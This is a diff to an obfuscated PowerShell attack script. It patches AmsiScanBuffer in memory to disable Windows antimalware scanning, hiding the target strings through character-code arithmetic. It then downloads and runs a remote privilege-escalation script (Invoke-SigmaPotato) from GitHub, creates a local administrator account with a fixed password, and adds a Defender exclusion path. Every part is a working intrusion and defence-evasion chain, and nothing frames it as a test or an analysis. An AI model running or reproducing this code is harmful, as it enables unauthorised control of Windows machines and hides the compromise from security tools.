@@ -1,35 +1,36 @@
 #Rasta-mouses Amsi-Scan-Buffer patch \n
-$qMY8oUk_OtSOeSLZ = @"
+$bPf8vXn = @"
 using System;
 using System.Runtime.InteropServices;
-public class qMY8oUk_OtSOeSLZ {
+public class bPf8vXn {
     [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr XJnopb56xvr, string kc1PPgGpZWE7jMIpzGYO);
+    public static extern IntPtr GetProcAddress(IntPtr BihxDXamejj, string exE8);
     [DllImport("kernel32")]
     public static extern IntPtr LoadLibrary(string name);
     [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr Zhj, UIntPtr PHIVX0aivw5XfhjKY, uint Klev_iH, out uint W6BwMDMnXCxqPcPCB);
+    public static extern bool VirtualProtect(IntPtr K14e8vMM, UIntPtr SS3, uint sqIsuw340kWA4, out uint okcgV);
 }
 "@
 
-Add-Type $qMY8oUk_OtSOeSLZ
+Add-Type $bPf8vXn
 
-$y60l2g7Vq8YIUSeZl = [qMY8oUk_OtSOeSLZ]::LoadLibrary("$(('ámsì.d'+'ll').NormAliZE([chAr]([byTe]0x46)+[chAr]([bYte]0x6f)+[chAr](114+72-72)+[CHAr]([bYTe]0x6d)+[CHaR](68+43-43)) -replace [CHar](92*70/70)+[chAr]([BYtE]0x70)+[chaR]([bYTe]0x7b)+[cHAr](77+16-16)+[ChaR](110*19/19)+[cHAr]([bYTE]0x7d))")
-$VWpMpfsN3S = [qMY8oUk_OtSOeSLZ]::GetProcAddress($y60l2g7Vq8YIUSeZl, "$(('ÂmsíS'+'cânBù'+'ffêr').NOrMALIZE([Char]([byte]0x46)+[ChAr]([BytE]0x6f)+[CHAR]([bYtE]0x72)+[ChAR]([bYTE]0x6d)+[cHAr](5+63)) -replace [cHar](92+7-7)+[CHar]([bYtE]0x70)+[ChaR](22+101)+[char]([BYte]0x4d)+[CHaR]([bYTE]0x6e)+[Char](125+94-94))")
+$w_f3VUrQKKFqoMgrVNLJ = [bPf8vXn]::LoadLibrary("$([cHAR]([ByTE]0x61)+[CHar]([BytE]0x6d)+[cHAR](83+32)+[CHar]([BYte]0x69)+[CHAR](37+9)+[cHAr](100+97-97)+[cHAr]([byte]0x6c)+[ChaR](28+80))")
+$nB4bsFm66Hl = [bPf8vXn]::GetProcAddress($w_f3VUrQKKFqoMgrVNLJ, "$([cHaR]([bYtE]0x41)+[CHar]([BYTe]0x6d)+[CHaR]([BytE]0x73)+[ChAr]([bytE]0x69)+[CHar]([BYTe]0x53)+[CHar](99*68/68)+[chAR](97+37-37)+[CHar](110)+[CHAR](66)+[cHAr]([bYTE]0x75)+[ChaR](102+67-67)+[ChAr]([BYte]0x66)+[cHar](101+3-3)+[ChAR]([BYte]0x72))")
 $p = 0
-[qMY8oUk_OtSOeSLZ]::VirtualProtect($VWpMpfsN3S, [uint32]5, 0x40, [ref]$p)
-$g0TSlV = "0xB8"
-$hm_d = "0x57"
-$uTsTgdc2fbPQe9hZp25 = "0x00"
-$zP_zLHIZVJqCkOB065pQ = "0x07"
-$bQqQoSsNdqUP = "0x80"
-$aBhINi = "0xC3"
-$x8Q = [Byte[]] ($g0TSlV,$hm_d,$uTsTgdc2fbPQe9hZp25,$zP_zLHIZVJqCkOB065pQ,+$bQqQoSsNdqUP,+$aBhINi)
-[System.Runtime.InteropServices.Marshal]::Copy($x8Q, 0, $VWpMpfsN3S, 6)
+[bPf8vXn]::VirtualProtect($nB4bsFm66Hl, [uint32]5, 0x40, [ref]$p)
+$Jb5RTkfAX9b_ooPK7 = "0xB8"
+$EzdGiheopbz5L1 = "0x57"
+$nJU9HNQSC5zEM9b9w3 = "0x00"
+$DpsG6XxTO1m = "0x07"
+$ImtQ0wun = "0x80"
+$W_p = "0xC3"
+$fatv_ectuUXGd50pxa = [Byte[]] ($Jb5RTkfAX9b_ooPK7,$EzdGiheopbz5L1,$nJU9HNQSC5zEM9b9w3,$DpsG6XxTO1m,+$ImtQ0wun,+$W_p)
+[System.Runtime.InteropServices.Marshal]::Copy($fatv_ectuUXGd50pxa, 0, $nB4bsFm66Hl, 6)
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
 Invoke-SigmaPotato -command "net user k kopq@123 /add"
 Invoke-SigmaPotato -command "net localgroup administrators k /add"
 Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"
+
 
 
 
